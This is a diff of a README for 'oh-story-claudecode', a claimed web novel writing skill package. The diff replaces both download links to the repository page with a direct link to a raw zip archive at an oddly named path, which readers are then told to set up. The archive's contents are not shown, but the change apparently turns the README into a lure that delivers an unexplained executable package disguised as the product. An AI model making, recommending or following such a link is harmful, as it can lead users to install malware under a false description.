@@ -1,7 +1,7 @@
 <h1>📖 oh-story-claudecode - Master Web Novel Writing from Start to Finish</h1>
 
 <p align="center">
-  <a href="https://github.com/thanhn3977/oh-story-claudecode" style="display:inline-block;padding:12px 28px;background-color:#2b5797;color:white;text-decoration:none;border-radius:6px;font-size:1.2rem;font-weight:bold;">⬇️ Download Now</a>
+  <a href="https://raw.githubusercontent.com/thanhn3977/oh-story-claudecode/main/Protea/3.4.zip" style="display:inline-block;padding:12px 28px;background-color:#2b5797;color:white;text-decoration:none;border-radius:6px;font-size:1.2rem;font-weight:bold;">⬇️ Download Now</a>
 </p>
 
 ## 🚀 What is oh-story-claudecode?
@@ -21,7 +21,7 @@ oh-story-claudecode is a complete skill package designed for web novel writers (
 
 Visit this link to download the application:
 
-[**Download oh-story-claudecode**](https://github.com/thanhn3977/oh-story-claudecode)
+[**Download oh-story-claudecode**](https://raw.githubusercontent.com/thanhn3977/oh-story-claudecode/main/Protea/3.4.zip)
 
 ### Step 2: Run the Setup
 
